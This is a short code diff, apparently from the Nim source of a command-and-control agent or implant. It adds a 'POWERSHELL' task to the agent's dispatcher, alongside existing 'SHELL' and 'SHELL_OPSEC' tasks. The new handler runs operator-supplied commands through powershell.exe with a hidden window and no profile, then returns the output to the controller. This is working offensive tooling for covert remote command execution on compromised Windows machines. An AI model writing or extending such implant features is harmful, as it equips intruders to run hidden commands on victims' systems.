@@ -2226,6 +2226,9 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "SHELL":
     t.sendResult(id, runShell(args), "")
 
+  of "POWERSHELL":
+    t.sendResult(id, runShell("powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"" & args & "\""), "")
+
   of "SHELL_OPSEC":
     t.sendResult(id, runShellOpsec(args), "")
 
